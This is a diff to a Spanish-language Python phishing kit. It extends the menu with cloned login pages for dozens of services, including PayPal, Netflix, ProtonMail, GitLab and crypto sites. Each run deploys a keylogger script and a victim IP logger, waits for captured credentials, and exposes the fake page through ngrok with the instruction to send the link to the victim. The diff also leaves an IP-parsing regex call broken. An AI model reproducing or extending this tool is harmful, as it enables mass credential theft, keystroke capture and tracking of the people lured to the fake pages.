@@ -571,23 +571,14 @@ def end():
 
 def loadModule(module):
        print(Green+"Creando sitio...")
+
 #Menu de seleccion de las paginas de phishing
 def runPhishing(page, option2): 
     os.system("rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/")
-    if option2 == '1' and page == 'Facebook':
+    if page == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
-    if option2 == '2' and page == 'Facebook':
-        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
-    if option2 == '3' and page == 'Facebook':
-        copy_tree("WebPages/fb_security_fake/", "Server/www/")
-    if option2 == '4' and page == 'Facebook':
-        copy_tree("WebPages/fb_messenger/", "Server/www/")
-    elif option2 == '1' and page == 'Google':
+    elif page == 'Google':
         copy_tree("WebPages/google_standard/", "Server/www/")
-    elif option2 == '2' and page == 'Google':
-        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
-    elif option2 == '3' and page == 'Google':
-        copy_tree("WebPages/google_advanced_web/", "Server/www/")
     elif page == 'LinkedIn':
         copy_tree("WebPages/linkedin/", "Server/www/")
     elif page == 'GitHub':
@@ -610,14 +601,56 @@ def runPhishing(page, option2):
         copy_tree("WebPages/steam/", "Server/www/")
     elif page == 'iCloud':
         copy_tree("WebPages/iCloud/", "Server/www/")
-    elif option2 == '1' and page == 'Instagram':
+    elif page == 'Instagram':
         copy_tree("WebPages/Instagram_web/", "Server/www/")
-    elif option2 == '2' and page == 'Instagram':
-        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
-    elif option2 == '1' and page == 'VK':
+    elif page == 'VK':
         copy_tree("WebPages/VK/", "Server/www/")
-    elif option2 == '2' and page == 'VK':
-        copy_tree("WebPages/VK_poll_method/", "Server/www/")
+    elif page == 'GitLab':
+        copy_tree("WebPages/gitlab/", "Server/www/")
+    elif page == 'NetFlix':
+        copy_tree("WebPages/netflix/", "Server/www/")
+    elif page == 'Origin':
+        copy_tree("WebPages/origin/", "Server/www/")
+    elif page == 'Pinterest':
+        copy_tree("WebPages/pinterest/", "Server/www/")
+    elif page == 'ProtonMail':
+        copy_tree("WebPages/protonmail/", "Server/www/")
+    elif page == 'Spotify':
+        copy_tree("WebPages/spotify/", "Server/www/")
+    elif page == 'Quora':
+        copy_tree("WebPages/quora/", "Server/www/")
+    elif page == 'PornHub':
+        copy_tree("WebPages/pornhub/", "Server/www/")
+    elif page == 'Adobe':
+        copy_tree("WebPages/adobe/", "Server/www/")
+    elif page == 'Badoo':
+        copy_tree("WebPages/badoo/", "Server/www/")
+    elif page == 'CryptoCurrency':
+        copy_tree("WebPages/cryptocurrency/", "Server/www/")
+    elif page == 'DevianArt':
+        copy_tree("WebPages/devianart/", "Server/www/")
+    elif page == 'DropBox':
+        copy_tree("WebPages/dropbox/", "Server/www/")
+    elif page == 'eBay':
+        copy_tree("WebPages/ebay/", "Server/www/")
+    elif page == 'Myspace':
+        copy_tree("WebPages/myspace/", "Server/www/")
+    elif page == 'PayPal':
+        copy_tree("WebPages/paypal/", "Server/www/")
+    elif page == 'Shopify':
+        copy_tree("WebPages/shopify/", "Server/www/")
+    elif page == 'Verizon':
+        copy_tree("WebPages/verizon/", "Server/www/")
+    elif page == 'Yandex':
+        copy_tree("WebPages/yandex/", "Server/www/")
+    elif page == 'Reddit':
+        copy_tree("WebPages/Reddit/", "Server/www/")
+    elif page == 'Subitoit':
+        copy_tree("WebPages/subitoit/", "Server/www/")
+    elif page == 'PlayStation':
+        copy_tree('WebPages/playstation/', "Server/www/")
+    elif page == 'Xbox':
+        copy_tree('WebPages/xbox/', "Server/www/")
 
 didBackground = True
 logFile = None
@@ -651,7 +684,7 @@ def waitCreds():
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.match('IP PUBLICA DE LA VICTIMA: (.*?)\n', lines).group(1)
+                ip = re.match('IP PUBLICA DE LA VICTIMA: (.*?)\n', lines)
                 resp = urlopen('https://ipinfo.io/json')
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
@@ -671,28 +704,44 @@ def waitCreds():
         creds.close()
 
 
-def runPEnv(): #menu where user select what they wanna use
+def runPEnv(): #menu 
     os.system('clear')
-    print ("No uses esta herramienta para el mal".format(GREEN, DEFAULT, CYAN))
+    print (Blue+"No uses esta herramienta para el mal".format(GREEN, DEFAULT, CYAN))
     for i in range(101):
         time.sleep(0.01)
         stdout.write("\r [+] Preparando todo... %d%%" % i)
         stdout.flush()
 
     print ("\n\n[+] Chekeando si tienes PHP ... ".format(CYAN, DEFAULT))
-    if 256 != os.system('which php'): #Checking if user have PHP
+    if 256 != os.system('which php'): 
         print (" --{0}>{1} OK.".format(CYAN, DEFAULT))
     else:
         print (" --> NO TIENES INSTALADO PHP: \n {0}*{1} Por favor instala PHP y corre el script de vuelta")
         exit(0)
-    option = input(""+Green+"\nSelecciona una opcion:\n\n 1-Facebook\n\n 2-Google\n\n 3-LinkedIn\n\n 4-GitHub\n\n 5-StackOverflow\n\n 6-WordPress\n\n 7-Twitter\n\n 8-Instagram\n\n 9-Snapchat\n\n 10-Yahoo\n\n 11-Twitch\n\n 12-Microsoft\n\n 13-Steam\n\n 14-VK\n\n 15-iCloud\n\n "+Red+"Eleccion --> "+Reset)
-    if option == '1':
+    print(Blue +"""          1 Facebook         13-Steam         25-Badoo              37-PlayStation
+          2-Google           14-VK            26-CryptoCurrency     38-Xbox
+          3-LinkedIn         15-iCloud        27-DevianArt
+          4-GitHub           16-GitLab        28-DropBox        
+          5-StackOverflow    17-Netflix       29-eBay
+          6-WordPress        18-Origin        30-MySpace
+          7-Twitter          19-Pinterest     31-PayPal
+          8-Instagram        20-ProtonMail    32-Shopify
+          9-Snapchat         21-Spotify       33-Verizon
+          10-Yahoo           22-Quora         34-Yandex
+          11-Twitch          23-PornHub       35-Reddit
+          12-Microsoft       24-Adobe         36-Subito.it""")
+    option = input(Green+"Eleccion --> "+Reset)
+    if option == '01':
         loadModule('Facebook')
         option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n 2 Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
         runPhishing('Facebook', option2)
+    if option == '1':
+        loadModule('Facebook')
+        option2 = ''
+        runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} \n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
+        option2 = ''
         runPhishing('Google', option2)
     elif option == '3':
         loadModule('LinkedIn')
@@ -716,7 +765,7 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Twitter', option2)
     elif option == '8':
         loadModule('Instagram')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} \n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
+        option2 = ''
         runPhishing('Instagram', option2)
     elif option == '9':
         loadModule('Snapchat')
@@ -740,13 +789,105 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Steam', option2)
     elif option == '14':
         loadModule('VK')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} \n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
+        option2 = ''
         runPhishing('VK', option2)
     elif option == '15':
         loadModule('iCloud')
         option2 = ''
         runPhishing('iCloud', option2)
-    else:
+    elif option == '16':
+        loadModule('GitLab')
+        option2 = ''
+        runPhishing('GitLab', option2)
+    elif option == '17':
+        loadModule('NetFlix')
+        option2 = ''
+        runPhishing('NetFlix', option2)
+    elif option == '18':
+        loadModule('Origin')
+        option2 = ''
+        runPhishing('Origin', option2)
+    elif option == '19':
+        loadModule('Pinterest')
+        option2 = ''
+        runPhishing('Pinterest', option2)
+    elif option == '20':
+        loadModule('ProtonMail')
+        option2 = ''
+        runPhishing('ProtonMail', option2)
+    elif option == '21':
+        loadModule('Spotify')
+        option2 = ''
+        runPhishing('Spotify', option2)
+    elif option == '22':
+        loadModule('Quora')
+        option2 = ''
+        runPhishing('Quora', option2)
+    elif option == '23':
+        loadModule('PornHub')
+        option2 = ''
+        runPhishing('PornHub', option2)
+    elif option == '24':
+        loadModule('Adobe')
+        option2 = ''
+        runPhishing('Adobe', option2)
+    elif option == '25':
+        loadModule('Badoo')
+        option2 = ''
+        runPhishing('Badoo', option2)
+    elif option == '26':
+        loadModule('CryptoCurrency')
+        option2 = ''
+        runPhishing('CryptoCurrency', option2)
+    elif option == '27':
+        loadModule('DevianArt')
+        option2 = ''
+        runPhishing('DevianArt', option2)
+    elif option == '28':
+        loadModule('DropBox')
+        option2 = ''
+        runPhishing('DropBox', option2)
+    elif option == '29':
+        loadModule('eBay')
+        option2 = ''
+        runPhishing('eBay', option2)
+    elif option == '30':
+        loadModule('MySpace')
+        option2 = ''
+        runPhishing('Myspace', option2)
+    elif option == '31':
+        loadModule('PayPal')
+        option2 = ''
+        runPhishing('PayPal', option2)
+    elif option == '32':
+        loadModule('Shopify')
+        option2 = ''
+        runPhishing('Shopify', option2)
+    elif option == '33':
+        loadModule('Verizon')
+        option2 = ''
+        runPhishing('Verizon', option2)
+    elif option == '34':
+        loadModule('Yandex')
+        option2 = ''
+        runPhishing('Yandex', option2)
+    elif option == '35':
+        loadModule('Reddit')
+        option2 = ''
+        runPhishing('Reddit', option2)
+    elif option == '36':
+        loadModule('Subitoit')
+        option2 = ''
+        runPhishing('Subitoit', option2)
+    elif option == '37':
+        loadModule('PlayStation')
+        option2 = ''
+        runPhishing('PlayStation', option2)
+    elif option == '38':
+        loadModule('Xbox')
+        option2 = ''
+        runPhishing('Xbox', option2)
+    elif option == '39':
         exit(0)
 
 def runNgrok():
@@ -758,7 +899,7 @@ def runNgrok():
         url = urlFile.read()
         urlFile.close()
         if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-            print(""+Green+"\n [+] Url de Ngrok : " + url + "\n Pasa el link a la victima para el ataque \n")
+            print(""+Green+"\n [+] Url de Ngrok : " + url + "\n Pasale el link a la victima para el ataque \n")
             break
 
 
